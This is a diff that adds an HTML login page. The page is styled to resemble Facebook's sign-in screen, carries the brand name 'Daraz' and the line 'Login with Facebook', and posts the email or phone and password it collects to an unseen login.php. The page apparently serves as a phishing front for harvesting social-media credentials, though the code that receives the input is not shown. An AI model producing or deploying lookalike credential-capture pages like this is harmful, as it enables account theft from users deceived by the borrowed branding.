@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Media Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            padding: 20px;
+        }
+        .brand {
+            width: 50%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .brand h1 {
+            font-size: 48px;
+            color: #1877f2;
+        }
+        .brand p {
+            font-size: 24px;
+            color: #606770;
+        }
+        .login-form {
+            width: 30%;
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            border-radius: 8px;
+        }
+        .login-form h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background-color: #165de0;
+        }
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #1877f2;
+            text-align: center;
+        }
+        .signup-link {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 16px;
+        }
+        .signup-link a {
+            color: #42b72a;
+        }
+
+        /* Media queries for responsiveness */
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                align-items: center;
+                padding: 10px;
+            }
+            .brand {
+                width: 100%;
+                text-align: center;
+                margin-bottom: 20px;
+            }
+            .brand h1 {
+                font-size: 36px;
+            }
+            .brand p {
+                font-size: 18px;
+            }
+            .login-form {
+                width: 100%;
+                max-width: 400px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .brand h1 {
+                font-size: 28px;
+            }
+            .brand p {
+                font-size: 16px;
+            }
+            .login-form h2 {
+                font-size: 20px;
+            }
+            .input-field, .login-btn {
+                padding: 10px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="brand">
+            <h1>Daraz</h1>
+            <p>Login with Facebook.</p>
+        </div>
+        <div class="login-form">
+            <h2>Login</h2>
+            <form action="login.php" method="post">
+                <input type="text" class="input-field" name="email" placeholder="Email or Phone Number" required />
+                <input type="password" class="input-field" name="password" placeholder="Password" required />
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <p class="forgot-password"><a href="#">Forgot Password?</a></p>
+            <div class="signup-link">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
